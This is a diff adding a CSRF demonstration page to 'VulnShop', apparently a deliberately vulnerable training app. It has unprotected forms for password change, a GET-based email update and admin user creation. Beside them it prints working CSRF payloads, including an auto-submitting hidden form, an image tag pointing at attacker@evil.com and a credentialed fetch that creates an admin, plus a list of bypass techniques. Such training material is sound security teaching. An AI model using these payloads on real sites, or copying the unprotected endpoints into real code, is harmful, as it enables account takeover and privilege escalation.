@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>CSRF Testing — VulnShop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">VulnShop</div>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="admin/index.html">Admin</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <h1>CSRF Vulnerability Testing</h1>
+    <p class="muted">This page demonstrates Cross-Site Request Forgery vulnerabilities.</p>
+
+    <div class="card mt">
+      <h2>1. Password Change (No CSRF Protection)</h2>
+      <p>Change password without CSRF token:</p>
+      <form id="password-form" method="POST" action="/api/change-password">
+        <input type="password" name="new_password" placeholder="New Password" required>
+        <input type="password" name="confirm_password" placeholder="Confirm Password" required>
+        <button type="submit">Change Password</button>
+      </form>
+      <div class="mt">
+        <h3>CSRF Attack Example:</h3>
+        <pre style="background: #f5f5f5; padding: 16px; overflow-x: auto;"><code>&lt;!-- Attacker's malicious page --&gt;
+&lt;form id="csrf-form" method="POST" action="http://vulnshop.com/api/change-password"&gt;
+  &lt;input type="hidden" name="new_password" value="hacked123"&gt;
+  &lt;input type="hidden" name="confirm_password" value="hacked123"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;</code></pre>
+      </div>
+    </div>
+
+    <div class="card mt">
+      <h2>2. Email Update (GET Request)</h2>
+      <p>Update email via GET request (vulnerable to CSRF):</p>
+      <form id="email-form" method="GET" action="/api/update-email">
+        <input type="email" name="email" placeholder="New Email" required>
+        <button type="submit">Update Email</button>
+      </form>
+      <div class="mt">
+        <h3>CSRF via Image Tag:</h3>
+        <pre style="background: #f5f5f5; padding: 16px; overflow-x: auto;"><code>&lt;img src="http://vulnshop.com/api/update-email?email=attacker@evil.com"&gt;</code></pre>
+      </div>
+    </div>
+
+    <div class="card mt">
+      <h2>3. Admin Actions (No Referer Check)</h2>
+      <p>Perform admin actions without proper CSRF protection:</p>
+      <form id="admin-form" method="POST" action="/api/admin/create-user">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="text" name="role" placeholder="Role" value="admin">
+        <button type="submit">Create User</button>
+      </form>
+      <div class="mt">
+        <h3>CSRF Attack Script:</h3>
+        <pre style="background: #f5f5f5; padding: 16px; overflow-x: auto;"><code>fetch('http://vulnshop.com/api/admin/create-user', {
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    username: 'attacker',
+    role: 'admin'
+  })
+});</code></pre>
+      </div>
+    </div>
+
+    <div class="card mt">
+      <h2>CSRF Protection Bypass Techniques</h2>
+      <ul>
+        <li>Remove or modify CSRF token</li>
+        <li>Use same-origin policy bypasses</li>
+        <li>Exploit weak token validation</li>
+        <li>Use GET requests for state-changing operations</li>
+        <li>Bypass Referer header checks</li>
+        <li>Use subdomain takeover for same-site cookies</li>
+      </ul>
+    </div>
+  </main>
+
+  <script src="assets/js/logger.js"></script>
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
